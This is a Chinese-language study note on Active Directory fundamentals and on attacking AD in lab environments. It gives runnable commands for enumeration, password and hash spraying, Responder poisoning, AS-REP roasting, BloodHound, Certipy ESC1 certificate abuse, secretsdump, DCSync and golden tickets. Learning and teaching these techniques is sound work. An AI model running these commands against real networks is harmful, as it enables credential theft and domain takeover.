---
title: 從 0 開始學 AD

---

[TOC]



原本下圖的攻擊手法我一個都不認得，所以在深入了解這個演講之前我決定好好的認識 AD，並且學習最基礎的 AD 攻擊知識。
![image](https://hackmd.io/_uploads/BJQhckNUkg.png)


## 基礎知識
### Active Directory ( AD )
AD 負責處理這兩個核心功能 :

- **Authentication (驗證)**：確認用戶的身份是否合法。例如，使用者輸入正確的帳號和密碼後，Active Directory 會驗證其身份。
- **Authorization (授權)**：在用戶通過身份驗證後，授權決定該用戶對資源的存取權限。例如，某個使用者是否能進入特定的檔案夾或使用特定的服務。

Active Directory 可以將相似的用戶放在一起並批量分配權限 :

- **Groups** : 用於將用戶、電腦或其他對象集合在一起，以便批量分配權限和管理。
- **Organizational Units ( OU )** : 可用於對使用者、群組和電腦進行分組，以簡化管理並將群組原則設定部署到網域中的特定物件。OU 也可用於將管理任務委派給用戶，例如重設密碼或解鎖用戶帳戶，而不授予他們可以透過群組成員資格繼承的額外管理權限。
- **Domain** : 是 AD 身份驗證、授權和資源管理的基本單位，能夠統一管理 domain 下的使用者、電腦和 OU 等。
- **Domain Controller ( DC )** : 它是 Domain 的核心，負責處理身份驗證請求、驗證網路上的使用者並控制誰可以存取網域中的各種資源。它還執行安全性策略並儲存有關網域中每個其他物件的資訊。
- **Forest** : 由一個或多個 domain 組成，提供了整個 AD 的邏輯範圍和邊界。

下圖為一個簡單的 forest 結構 :
- 根網域是 INLANEFREIFHT.LOCAL
- 根網域包含 3 個子網域
- ADMIN 網域包含 GPOs、OU
> Group Policy Object (GPO)
> [群組原則物件 (GPO)](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects) 是策略設定的虛擬集合。每個 GPO 都有一個唯一的 GUID。 GPO 可以包含本機檔案系統設定或 Active Directory 設定

![image](https://hackmd.io/_uploads/S1nXj1Yr1e.png)


### Active Directory Domain Services ( AD DS )

提供儲存目錄資料的方法，並使這些資料可供網路使用者與系統管理員使用，方便集中管理網域內的使用者、裝置和資源，提供身份驗證、授權和群組策略管理功能，實現安全高效的企業網路管理。執行 AD DS 的伺服器為 Domain Controller。

#### AD DS 服務包括：

- 網域服務 (Domain Services)
儲存集中式數據，並管理使用者與網域之間的通訊；包括登入驗證和搜尋功能。
- 憑證服務 (Certificate Services)
負責生成、管理和共享憑證。憑證利用加密技術，讓使用者能透過公鑰在網路上安全地交換資訊。
- 輕型目錄服務 (Lightweight Directory Services)
支援基於開放式協議（LDAP）的目錄應用程式。
- 目錄聯合服務 (Directory Federation Services)
提供單一登入 (SSO)，讓使用者在一次登入的會話中驗證多個網頁應用程式。
- 權限管理服務 (Rights Management)
控制資訊權限與管理。AD RMS 可加密伺服器上的內容（如電子郵件或 Word 文件），以限制存取權限。
    > AD RMS（Active Directory Rights Management Services）用於幫助企業保護資訊，確保敏感內容僅能被授權的用戶訪問和使用。主要針對文檔、電子郵件等資料進行權限保護和管理。


### Active Directory Certificate Services ( AD CS )

ADCS 可以視作是 AD 的 PKI，有 CA 可以管理憑證及提供不同方法來讓 Client 註冊跟互動

#### Role service

- 憑證授權單位 ( CA )
CA 的主要用途是簽發憑證、撤銷憑證，以及發佈授權單位資訊存取 (AIA) 和撤銷資訊。 部署的第一個 CA 會成為內部 PKI 的 root。
    ![image](https://hackmd.io/_uploads/HkfXbkE8Je.png)
CA 會包含很多的憑證 template，再由使用者去選擇範本並註冊新的證書。
    ![image](https://hackmd.io/_uploads/B1MY-kELke.png)
    ![image](https://hackmd.io/_uploads/SJxS5JNLJg.png)
- 憑證授權單位網頁註冊
    在使用者使用未加入網域的裝置，或執行 Windows 以外作業系統的情況下，此元件提供核發和更新憑證的方法。
- 線上回應者
您可以使用此元件來設定和管理線上憑證狀態通訊協定 (OCSP) 驗證與撤銷檢查。 Online Responder 可將特定憑證的撤銷狀態要求解碼、評估這些憑證的狀態，並傳回已簽署的回應 (內含所要求的憑證狀態資訊)。
- 網路裝置註冊服務 (NDES)
使用此元件，路由器、交換器和其他網路裝置均可從 AD CS 取得憑證。
- 憑證註冊 Web 服務 (CES)
在執行 Windows 和 CA 的電腦之間，這個 CA 元件可以作為 Proxy 用戶端。 CES 可讓使用者、電腦或應用程式使用 Web 服務連線至 CA：
    - 要求、更新及安裝已簽發的憑證。
    - 擷取憑證撤銷清單 (CRL)。
    - 下載根憑證。
    - 透過網際網路或跨樹系進行註冊。
    - 為屬於不受信任的 AD DS 網域或未加入網域的電腦自動更新憑證。
- 憑證註冊原則 Web 服務
此元件可讓使用者取得憑證註冊原則資訊。 與 CES 結合後，將可在使用者裝置未加入網域或無法連線至網域控制站的情況下，啟用原則式憑證註冊。




### Kerberos

Kerberos 是一種基於的 statelessstate tickt 身份驗證協議，避免在網路上傳輸用戶密碼。作為 Active Directory Domain Services (AD DS) 的一部分，網域控制器包含一個 Kerberos 金鑰分發中心（KDC），負責簽發票證。
:::warning
Kerberos 協定使用連接埠 88（TCP 和 UDP）。在列舉 Active Directory 環境時，我們通常可以透過使用 Nmap 等工具執行連接埠掃描來尋找開放連接埠 88 來定位網域控制站。
:::

#### 身份驗證流程
1. 當使用者向系統發起登入請求時，使用者的客戶端會向 KDC 請求票證，並使用用戶的密碼加密請求，請求包含 SPN。
2. 如果 KDC 能使用用戶的密碼解密請求（AS-REQ），它將創建一個票證授權票證（TGT, Ticket Granting Ticket），並將其傳送給用戶。
3.4. 用戶隨後將其 TGT 提交給網域控制器，請求一個服務授權票證（TGS, Ticket Granting Service），該票證使用相關服務的 NTLM 密碼雜湊進行加密。
5. 客戶端向應用程式或服務提交 TGS 以請求訪問，該應用程式或服務使用其密碼雜湊解密票證。
![image](https://hackmd.io/_uploads/SkG7N-dSyl.png)

### Kerberos Delegation
Kerberos 委派是 Kerberos 驗證協定中的擴展，它允許伺服器充當中介、模擬客戶端並取得票證以存取其他網路資源，而無需客戶端單獨對每個資源進行重新驗證。簡單來說，當用戶通過一個服務進行身份驗證時，這個服務可以將用戶的身份傳遞給其他後端服務。

沒有委派的情況需用戶針對不同服務做驗證，如下圖 :
![image](https://hackmd.io/_uploads/ryyrTFcS1x.png)

> userAccountControl（UAC） 是一個 AD 屬性，該屬性控制帳戶的各種屬性，像是是否啟用帳戶、帳戶是否具有管理員權限等。

#### 三種不同的委派類型 :
- Unconstrained delegation 不受約束的委派
    - 配置無約束委派時，物件的 userAccountControl 屬性會更新 TRUSTED_FOR_DELEGATION 標誌
    - 服務可以使用使用者的 TGT 為使用者要求任何其他服務的 TGS 。
    ![image](https://hackmd.io/_uploads/BytDMq9Syx.png)
- Constrained delegation 約束委派
    - 帳戶配置為約束委派 userAccountControl 屬性就會更新為 TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 標誌
    - 約束委派 AD 會設定哪些服務可以接收委派的身份，並限制該身份只能在特定的服務上使用。
    ![image](https://hackmd.io/_uploads/SkkUfjqBJx.png)


- Resource-based Constrained Delegation 基於資源的約束委派
    - 資源會使用 msDS-AllowedToActOnBehalfOfOtherIdentity 屬性來指定哪些服務帳戶可以來進行委派
    - 以下是傳統約束委派（Constrained Delegation）與基於資源的約束委派（RBCD）的對比表格：

    | **特性**                               | **傳統約束委派（Constrained Delegation）**                                  | **基於資源的約束委派（RBCD）**                                       |
    |--------------------------------------|----------------------------------------------------------|--------------------------------------------------------|
    | **委派控制者**                        | 由服務控制（例如 Web 伺服器決定將用戶的身份委派給哪些服務）                      | 由資源控制（例如 SQL Server 控制哪些服務可以委派身份進行存取）          |
    | **配置方式**                          | 在源服務上配置，指定可以接收委派的服務                                      | 在目標資源（例如 SQL Server）上配置，指定可以對其進行委派的服務帳戶   |
    | **安全性**                            | 可能存在服務間無限制的委派風險                                                | 增強了安全性，因為只有受信任的服務能夠對資源進行委派                    |

    ![image](https://hackmd.io/_uploads/S12qVoqH1g.png)







## 列舉各項資訊

### 外部偵查
| **項目**             | **描述**               |**工具**|
|----------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----|
| **IP 空間**           | 目標的有效 ASN，使用於組織公共基礎設施、雲端存在、託管服務提供商的網段、DNS 記錄等。| [BGP Toolkit](https://bgp.he.net/) |
| **域名資訊**         | 基於 IP 數據、DNS 以及站點註冊訊息。誰管理該域名？是否有與目標相關的子域名？是否有公開訪問的域名服務（如郵件伺服器、DNS、網站、VPN 門戶等）？能否確定有何防禦措施？（如 SIEM、AV、IPS/IDS 等）|[Domaintools](https://whois.domaintools.com/) [ViewDNSinfo](https://viewdns.info/)|
| **架構格式**         | 我們能否發現組織的郵件帳戶、AD 用戶名，甚至密碼策略？有無任何信息能幫助我們構建有效的用戶名列表，用來測試外部服務的密碼噴射、憑證填充、暴力破解等。   |[HaveIBeenPwned](https://haveibeenpwned.com/) [linkedin2username](https://github.com/initstring/linkedin2username)|
| **資料披露**         | 查找**公開訪問**的文件（如 .pdf、.ppt、.docx、.xlsx 等），其中包含有助於了解目標的任何訊息。例如，任何公開的文件中包含內部網站列表、用戶元數據、共享信息或環境中的其他關鍵軟硬件（如推送到公開 GitHub 倉庫的憑證、PDF 元數據中的內部 AD 用戶名格式）。| [google-hacking-database](https://www.exploit-db.com/google-hacking-database )|
| **資料洩露**         | 任何公開釋放的用戶名、密碼或其他關鍵訊息，這些訊息可以幫助攻擊者獲得立足點。          |[HaveIBeenPwned](https://haveibeenpwned.com/) [Dehashed](https://www.dehashed.com/)|

### 找使用者
要爆出 user 有以下方式 :
- enum4linux
:::info
enum4linux -U 172.16.5.5  | grep "user:"
:::
![image](https://hackmd.io/_uploads/B1bmwhySJl.png)
- rpcclient
:::info
rpcclient -U "" -N 172.16.5.5
:::
![image](https://hackmd.io/_uploads/Byj8b6JHJg.png)
- crackmapexec
:::info
crackmapexec smb 172.16.5.5 --users
:::
![image](https://hackmd.io/_uploads/SyKdWp1B1x.png)

有帳號密碼後的列舉
![image](https://hackmd.io/_uploads/rJP4kexrJx.png)

- ldapsearch
ldapsearch 我們將需要指定一個有效的 LDAP 搜尋過濾器。
:::info
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
:::
![image](https://hackmd.io/_uploads/B16lMpkSJg.png)
- windapsearch.py
:::info
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
:::
![image](https://hackmd.io/_uploads/Sk1EM61SJg.png)

#### Kerbrute
使用 Kerbrute 可以列舉有效的 AD 帳戶並進行密碼噴射。
:::success
這個工具利用了 Kerberos 預身份驗證不同的結果來判斷用戶是否存在，這是一種更快速且更隱蔽的密碼噴灑方法。`這種方法不會產生 Windows 事件 ID 4625：登錄失敗`，但是會產生 事件 ID 4768: A Kerberos authentication ticket (TGT) was requested。該工具向域控制器發送TGT請求，如果 KDC 回應錯誤“PRINCIPAL UNKNOWN”，則該用戶名無效。每當 KDC 要求 Kerberos 預身份驗證時，這表示該用戶名存在，工具將標記為有效。`這種用戶名枚舉方法不會造成登錄失敗，也不會鎖定帳戶。`
:::


使用 jsmith.txt 字典檔來嘗試這種方法，該字典包含48,705個可能的常見用戶名，格式為 flast。GitHub上的 [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames.git) 是進行這種類型攻擊的絕佳資源，可以用來通過 Kerbrute 列舉有效的用戶名。

![image](https://hackmd.io/_uploads/rJKY0JxBye.png)

### 找密碼原則
- rpcclient
    :::info
    rpcclient -U "" -N 172.16.5.5
    :::
    ![image](https://hackmd.io/_uploads/HkqNfelrke.png)
    :::success
    密碼最少為 8 個字元
    有密碼複雜性要求
    :::
- enum4linux
    :::info
    enum4linux -P 172.16.5.5
    :::
    ![image](https://hackmd.io/_uploads/Hyvg7llrke.png)
    :::success
    密碼最少為 8 個字元
    密碼最長為 24 個字元
    帳戶在達到鎖定閾值後會被鎖定 30 分鐘。
    輸入錯誤密碼 5 次後帳戶會被鎖定。
    用戶不會因為未活動而被自動登出。
    :::

如果組織內有一台可以登入的 windows 主機，可以進去查看它的本地帳戶設置，可以用來猜測整個系統或組織採取一樣的管理策略

- net
    :::info
    net accounts
    :::
    ![image](https://hackmd.io/_uploads/rJdiBllH1e.png)
    :::success
    - 密碼永不過期（密碼最長期限設定為無限制）
    - 最小密碼長度為 8，因此很可能使用弱密碼
    - 鎖定閾值是 5 次錯誤密碼
    - 帳戶鎖定 30 分鐘
    :::
- PowerView
    :::info
    import-module .\PowerView.ps1
    Get-DomainPolicy
    :::
    ![image](https://hackmd.io/_uploads/B1jDhggB1l.png)
    :::success
    - 密碼永不過期（密碼最長期限設定為無限制）
    - 最小密碼長度為 8，因此很可能使用弱密碼
    - 鎖定閾值是 5 次錯誤密碼
    - 帳戶鎖定 30 分鐘
    :::

## 找密碼

### spray
- kerbrute
    :::info
    kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
    :::
    ![image](https://hackmd.io/_uploads/H1YiYexrJx.png)
- crackmapexec
    :::info
    sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
    :::
    ![image](https://hackmd.io/_uploads/SJk19egHkx.png)

    如果從本機 SAM 資料庫找到本機管理員帳戶的 NTLM hash，就可以在整個子網路（或多個子網路）上噴射 NT hash，以尋找具有相同密碼集的本機管理員帳戶。在下面的範例中，我們嘗試使用從另一台電腦檢索的內建本機管理員帳戶 NT hash 對 /23 網路中的所有主機進行驗證。該 --local-auth 標誌將告訴工具僅在每台電腦上嘗試登入一次

    > SAM 資料庫（Security Accounts Manager 資料庫）包含了本機使用者帳戶的資料，包括用戶名、密碼雜湊以及其他安全性資訊。然而，由於 SAM 資料庫包含敏感資料，它是受到保護的，只有具有管理員權限的使用者或特定系統服務才能訪問它。

    :::info
    sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
    :::
    ![image](https://hackmd.io/_uploads/HJ5oixgByx.png)

### Poisoning

當使用 LLMNR/NBT-NS 進行名稱解析時，網路上的任何主機都可以回覆。這就是我們毒害 Responder 這些請求的地方。

Link-Local Multicast Name Resolution (LLMNR) & NetBIOS Name Service (NBT-NS) 都是用於網路上設備名稱解析的協定，它們在某些情況下可能會影響到網路的安全性。這兩者在本地網路環境中運行，並且通常會被用於不依賴 DNS（域名系統）的情況下進行名稱解析。如果 LLMNR 失敗，將使用 NBT-NS。

- LLMNR 使用 5355 UDP port
- NBT-NS 使用 137 UDP port

| 特徵                    | **LLMNR**                              | **NBT-NS**                               |
|-------------------------|----------------------------------------|------------------------------------------|
| **用途**                | 名稱解析，主要在無 DNS 的情況下使用   | NetBIOS 名稱解析，用於識別設備      |
| **工作原理**            | 使用 multicast 發送查詢請求           | 使用廣播發送查詢請求              |
| **應用場景**            | Windows 網絡，局域網中無 DNS 時使用   | 舊版 Windows 網絡中仍有可能使用      |
| **安全風險**            | 中間人攻擊、名稱解析攻擊              | 名稱欺騙、信息泄漏                   |

#### poisoning 流程

:::success
Sample :

1. 主機嘗試連接到位於 \\print01.inlanefreight.local 的印表機伺服器，但意外地輸入了 \\printer01.inlanefreight.local。
2. DNS 伺服器回應，指出該主機未知。
3. 然後，主機向整個本地網路廣播，詢問是否有人知道 \\printer01.inlanefreight.local 的位置。
4. 攻擊者（我們正在Responder運行）回應主機，指出主機正在尋找 \\printer01.inlanefreight.local。
5. 主機相信此回复，並向攻擊者發送包含用戶名和 NTLMv2 密碼雜湊的身份驗證請求。
6. 如果存在適當的條件，則可以離線破解該雜湊值或將其用於 SMB 中繼攻擊。
:::


- Responder 是一款專門用於毒害 LLMNR、NBT-NS 和 MDNS 的工具，具有許多不同的功能。
- Inveigh 是一個跨平台的 MITM 平台，可用於欺騙和投毒攻擊。( windows )
> Responder 使用 Python 編寫，通常在 Linux 攻擊主機上使用，但也有一個可在 Windows 上執行的 .exe 版本。 Inveigh 是用 C# 和 PowerShell（被視為遺留）寫的。這兩個工具都可以用來攻擊以下協定：
> LLMNR、DNS、MDNS、NBNS、DHCP、ICMP、HTTP、HTTPS、SMB、LDAP、WebDAV、Proxy Auth

#### responder 參數解析：
- -A：進入分析模式，允許我們查看 NBT-NS、BROWSER 和 LLMNR 請求，但不會發送任何假回應。
- -wf：啟動 WPAD 騙局代理伺服器，這會讓攻擊者模擬代理伺服器進行流量攔截。
- -f：用來識別遠端主機的操作系統和版本，這對於進一步的攻擊有幫助。
- -v：增加輸出的詳細程度，有助於在遇到問題時診斷錯誤，但會導致控制台顯示大量額外資料。
- -F 和 -P：這些選項可以強制 NTLM 或 Basic 認證，並強制代理認證，但可能會引起登錄提示，因此應謹慎使用。
- -w：啟用內建的 WPAD 代理伺服器，這對於大型組織尤其有效。當瀏覽器的自動檢測設置啟用時，所有通過 Internet Explorer 發出的 HTTP 請求都會被捕獲。

responder 必須以 sudo 權限或以 root 身分執行該工具，並確保攻擊主機上有必須的連接埠可用

:::info
捕獲 hash，如下圖 :

sudo responder -I ens224 
工具開始監控網路流量，針對 NetBIOS、LLMNR 和 MDNS 的名稱解析請求。它會偽造回應來引誘受害者設備將它的流量重定向到自己，進而取得網路上的敏感資訊
:::
![image](https://hackmd.io/_uploads/B1QchdYEke.png)

通常通過 Responder 獲取到的哈希類型都是 NTLMv2，獲得 hash 之後可以用 hashcat 來識別跟爆破密碼，hashcat 的 NTLMv2 編號是 5600 。

### AS-REP Roasting
AS-REP Roasting 是一種技術，使攻擊者能夠竊取已停用了 Kerberos 預先驗證的使用者帳戶的密碼雜湊值
![image](https://hackmd.io/_uploads/S1uIRNqHyg.png)

- Kerberos 身份驗證
    - AS-REQ (Authentication Service Request)：當用戶需要存取某些資源時，會向身份驗證伺服器 (AS) 傳送請求，這個請求會包含用戶的身份資訊（例如使用者名稱）以及加密的時間戳記。這個時間戳記是用用戶的密碼雜湊值加密的。
    - AS-REP (Authentication Service Reply)：如果 KDC 能夠成功解密時間戳記，並驗證用戶身份，則會回傳 AS-REP 訊息，其中包含一個 TGT (Ticket Granting Ticket)，該票證用於後續的資源存取請求。
- 預先驗證是指要求用戶在發送 AS-REQ 請求時，必須提供一個加密的時間戳記，這個時間戳記是由用戶的密碼雜湊值加密的。
- 如果 Kerberos 服務器上某個使用者的帳戶停用了預先驗證，則該使用者的身份驗證請求（AS-REQ）將不需要提供加密的時間戳記。這樣，攻擊者就可以向 KDC 發送 AS-REQ 請求，並且 KDC 會回傳一個 AS-REP 訊息，該訊息包含了由 KDC 使用用戶的密碼加密的資訊。

如果 Kerberos 預驗證被禁用，userAccountControl 屬性將包含一個名為 UF_DONT_REQUIRE_PREAUTH 的標誌，這個標誌的值為 0x400000。
:::info
impacket-GetNPUsers -dc-ip 10.10.10.161 -no-pass -usersfile user.txt htb.local/ 

這條命令使用 Impacket 工具集中的 GetNPUsers 來從 Active Directory 網域中提取使用者的 Kerberos 票證（TGT），並針對特定帳戶執行 Kerberos 攻擊。它的目的是利用 Kerberos 預先驗證已停用 的帳戶，從而收集可以離線破解的票證。

- -dc-ip 10.10.10.161
-dc-ip 參數指定了 域控制器（Domain Controller） 的 IP 地址。在這裡，10.10.10.161 是 Active Directory 域控制器的 IP 地址。這個域控制器負責處理 Kerberos 票證的發放與驗證。
-  -no-pass
-no-pass 參數告訴工具在請求 Kerberos 票證時 不需要提供密碼。這意味著工具會嘗試獲取票證，即使攻擊者不擁有目標使用者的密碼。 // 當 Kerberos 預先驗證被停用時有效
- -usersfile user.txt 先前爆出來的
- htb.local/ 這是目標網域的名稱。在這裡，htb.local 是 Active Directory 域的名稱，指定了目標的 Kerberos 網域。

:::
 ![image](https://hackmd.io/_uploads/SJfhhnzB1e.png)

## 獲得憑證後進一步列舉

有使用者憑證才能比較好的列舉想要的東西

- 值得注意的 ACE

| ACE                 | 解釋   | 
| ------------------- | ------|
| GenericWrite | 允許我們對目標物件的非保護屬性進行寫入操作。 | 
| GenericAll   | 該權限賦予我們對目標物件的完全控制權 | 
| AddSelf      | 可利用這一權限將自己添加到有權限的群組中，從而提升自己的權限 | 
|ForceChangePassword | 讓我們有權在不知道使用者密碼的情況下重置使用者的密碼   | 


### Linux
crackmapexec ( CME )
:::success
crackmapexec smb -h : 重點如下

- -u Username The user whose credentials we will use to authenticate
- -p Password User's password
Target (IP or FQDN) Target host to enumerate (in our case, the Domain Controller)
- --users Specifies to enumerate Domain Users
- --groups Specifies to enumerate domain groups
- --loggedon-users Attempts to enumerate what users are logged on to a target, if any
:::

找使用者 :
note : 過濾掉 badPwdCount 屬性大於 0 的所有用戶，不要被鎖了。
:::info
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
:::
![image](https://hackmd.io/_uploads/SJen4ZeH1g.png)


找群組 :
:::info
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
:::
![image](https://hackmd.io/_uploads/B1B2HZxBJx.png)

查看特定主機，看有誰登入
:::info
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
:::
![image](https://hackmd.io/_uploads/HJ3X8-grkg.png)上面寫 pwn3d 表示這台主機在我這個憑證下是可用的 


**RPCClient** 列舉 user 資訊
![image](https://hackmd.io/_uploads/r1qKwZxH1l.png)

### Windows

使用 ActiveDirectory PowerShell 模組
:::info
- Import-Module ActiveDirectory
- Get-Module
:::
![image](https://hackmd.io/_uploads/SyXgtZlSkl.png)

列舉有關網域的一些基本資訊
:::info
Get-ADDomain
:::
![image](https://hackmd.io/_uploads/SJ1mY-eBkl.png)

列舉使用者資料
:::info
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
:::
![image](https://hackmd.io/_uploads/HyF_qWeHye.png)
-  Get-ADUser 用來檢索、篩選和顯示指定的使用者資訊。
-  -Filter {ServicePrincipalName -ne "$null"} 篩選出擁有 ServicePrincipalName (SPN) 的使用者帳戶
-  -Properties ServicePrincipalName 要顯示 ServicePrincipalName 屬性

> Service Principal Name (SPN)
> - Kerberos 使用 SPN 來查詢服務的帳戶資訊，進而生成服務票證，幫助進行身份驗證。
> - 客戶端應用程式無需知道服務執行的具體帳戶名稱，只需提供 SPN 即可進行驗證。

列舉群組
:::info
Get-ADGroup -Filter * | select name
:::
![image](https://hackmd.io/_uploads/SyRKiZgSyg.png)

列舉特定群組詳細資訊、人員
:::info
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
:::
![image](https://hackmd.io/_uploads/ryXsiZlS1g.png)
![image](https://hackmd.io/_uploads/SynCiblr1l.png)


### BloodHound
#### 安裝 
:::info
sudo apt update && sudo apt install -y bloodhound
sudo neo4j console
:::


到 http://localhost:7474/ 會看到以下畫面，帳號密碼為 neo4j/neo4j
![image](https://hackmd.io/_uploads/rkn6LVtBye.png)

接著會要求更改密碼，改完就會出現以下畫面，該密碼也會成為 BloodHound 密碼
![image](https://hackmd.io/_uploads/r1QUvVFSye.png)

安裝 bloodhound 套件，用來蒐集目標資料
:::info
pip install bloodhound
:::

#### 使用
使用 bloodhound 套件蒐集資料
:::info
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
:::
```
-d 網域
-u 使用者
-p 密碼
-gc 主機
-c 要收集的方法，包含 Group、LocalAdmin、Session、Trusts、Default (all previous)、DCOnly (no computer connections)、DCOM、RDP、PSRemote、LoggedOn、Container、ObjectProps、ACL、All
-ns 目標伺服器。
```
![image](https://hackmd.io/_uploads/SyQYuEFSJg.png)

接著把 .json 檔匯入 bloodhound，點擊分析就可以看到達到目標的最短路徑，也能看到該路徑利用的方式
![image](https://hackmd.io/_uploads/By7MFEYHkg.png)
![image](https://hackmd.io/_uploads/r1-4tVKryl.png)
![image](https://hackmd.io/_uploads/rkTvfHFSyg.png)
![image](https://hackmd.io/_uploads/ryL9JIFS1l.png)


## 進階工具及技術
### Certipy
[Certipy](https://github.com/ly4k/Certipy) 是一種用於枚舉和濫用 Active Directory 憑證服務 (AD CS) 的攻擊性工具。只要擁有一組有效的使用者憑證就可以找出很多機敏的資訊。

#### 安裝
:::info
pip3 install certipy-ad
:::

#### 使用

以下指令用於找出易受攻擊的 template，並且會將資料輸出成 Certipy.txt 檔案
:::info
certipy find -vulnerable -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!'
:::
```
-u: Domain User
-p: Domain User Password
-dc-ip: Domain Controller IP
```

打開檔案可以獲得以下資訊
![image](https://hackmd.io/_uploads/HyoKG5iB1g.png)
:::success
- Template : ESC1
- Client authentication : true 服務允許經過身份驗證的使用者訪問
- Entrollee Supplies Subject : true 證書請求過程中，註冊者需要提供證書的主體資訊，也就能讓註冊者可以自己決定 SAN
> Subject Alternative Name ( SAN ) : 允許證書包含多個額外的識別名，用來擴展證書所代表的實體或資源的範圍，也讓一個證書可以被多個域名或 IP 地址共享。
>
> 也就讓攻擊者可以製作一個證書，將 SAN 欄位設置為 Administrator@domain.local，並將其提交給 CA 進行簽發。之後他就可以使用這個證書來進行身份驗證，以管理員的身份做事。
- Requires Manager Approval : False 這個憑證申請不用主管允許
- Enrollment Rights : ACU.LOCAL\Domain Users 表示一般使用者都可以去註冊證書
- Vulnerabilities : 說明這個設置哪裡有問題
:::


### ESC1 vuln
![image](https://hackmd.io/_uploads/rJNX1kNL1e.png)
![image](https://hackmd.io/_uploads/HyoKG5iB1g.png)
以上內容發現這是 ESC1 錯誤配置的憑證範本 :boom: 

#### ESC1 vuln 利用

以下是請求 admin 證書的指令 :
:::info
certipy req -dc-ip 192.168.0.144 -u Guts@ACU.local -p 'P@ssw0rd!' -ca ACU-ANIKATE-DC-CA -target ANIKATE-DC.ACU.local -template ESC1 -upn Administrator@ACU.local -dns Anikate-DC.ACU.local
:::
```
- certipy req : req 用來發送證書請求
- -dc-ip 192.168.0.144 : 指定 DC 的 IP 地址
- -u Guts@ACU.local : 先前獲得的有效憑證帳號，此帳戶將用來進行身份驗證，以便發送證書請求
- -p 'P@ssw0rd!' : Guts@ACU.local 的密碼
- -ca ACU-ANIKATE-DC-CA : 指定 CA，ACU-ANIKATE-DC-CA 是證書授權機構的名稱
- -target ANIKATE-DC.ACU.local : ANIKATE-DC.ACU.local 是目標主機的名稱，證書會針對這個主機來發放
- -template ESC1 : 使用的證書範本
- -upn Administrator@ACU.local : 說明這張證書代表 ACU.local 中的 Administrator 
- -dns Anikate-DC.ACU.local : 證書請求中將要註冊的 DNS 名稱
```
:::success
...
...
...
Saved certificate and private key to 'administrator_anikate-dc.pfx'
:::

使用剛才拿到的憑證對 DC 進行身份驗證，我就可以拿到 TGT，也能拿到 NT hash
:::info
certipy auth -pfx administrator_anikate-dc.pfx -dc-ip 192.168.0.144
:::
:::success
...
Got TGT
Saved Credential cache to administrator.ccache
...
Got hash for 'administrator@acu.local':xxxx...
:::

最後就可以用這個身分做到許多事情，包含竊取更多 hash
:::info
impacket-secretsdump -hashes 'xxx....:xxx...' ACU.local/Administrator@192.168.0.144.'
:::

#### 後續

當我拿下一個 domain 之後，我還可以因為 domain 之間的信任關係將整個 forest 拿下來。
![image](https://hackmd.io/_uploads/ByUy3JNL1e.png)


### mimikatz
[mimikatz](https://github.com/gentilkiwi/mimikatz) 可以從記憶體中提取明文密碼、雜湊值、PIN 碼和 kerberos 票證，也可以做到 pass-the-hash, pass-the-ticket 及 build Golden tickets 攻擊。

### DCSync 攻擊
為了保持 Domain 內多台 DC 之間的帳戶資訊同步，AD 使用了 DCSync 的同步機制。這個同步過程允許一個 DC 向其他 DC 請求特定用戶的帳戶資料（如密碼哈希、Kerberos 票證等）來進行複製。
所以攻擊者就透過模擬 DC 的行為，通過使用適當的權限發送同步請求來獲取敏感資料，也就能夠透過這個方式來提權。

### Golden ticket
KRBTGT 是 Kerberos 票證服務所使用的特殊帳戶，所有 TGT 都使用 KRBTGT 帳戶的金鑰加密，所以拿到 KRBTGT 帳戶的 NTLM hash，就可以用來生成偽造的 Kerberos 票證，也稱為金票。主要用於橫向。

這條 Mimikatz 的指令是嘗試從 AD 獲取 KRBTGT 帳戶的 hash。
:::info
lsadump::dcsync /user:DOMAIN\KRBTGT
:::

```
lsadump::dcsync：執行 DCSync 攻擊，從 DC 中同步帳戶資料。
/user:DOMAIN\KRBTGT：指定要同步的目標帳戶，這裡指的就是 Domain 的 KRBTGT 帳戶
```

這條 Mimikatz 的指令是做金票攻擊
:::info
kerberos::golden /User:<any-username-youwant> /domain:<domainname> /sid:<domainSID> /krbtgt:<krbtgt-ntlm-hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"
:::
```

- kerberos::golden：用來創建 Golden Ticket。
- /User:<any-username-youwant>：指定 Golden Ticket 所要模擬的用戶名。通常會選擇高權限用戶。
- /domain:<domainname>：指定目標的域名，這是 DC 所屬的 Domain。
- /sid:<domainSID>：指定 Domain 的 SID（Security Identifier），這是每個 AD Domain 的唯一標識符。
- /krbtgt:<krbtgt-ntlm-hash>：它是生成 Golden Ticket 所必須的密鑰，是攻擊前需要先獲得的資訊。
- id:500：指定模擬的用戶 ID，500 是 Domain 管理員帳戶的預設 ID。
- /groups:512：指定群組，512 是 Domain 管理員群組的 GUID。
- /startoffset:0：表示票證從當前時間立即生效。
- /endin:600：表示票證有效期為 600 分鐘。
- /renewmax:10080：指定票證的最大續期時間，這設為 10080，即 7 天（10080 分鐘）。這讓攻擊者可以在長達 7 天的時間內使用這個票證。
- /ptt：這個選項代表 "Pass-the-Ticket"，把生成的 Golden Ticket 直接注入到當前的 Kerberos 身份驗證上下文中，繞過身份驗證。
```

    
## 參考
- [AD DS 簡介](https://learn.microsoft.com/zh-tw/training/modules/introduction-to-ad-ds/)
- [AD DS 網域服務](https://learn.microsoft.com/zh-tw/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)
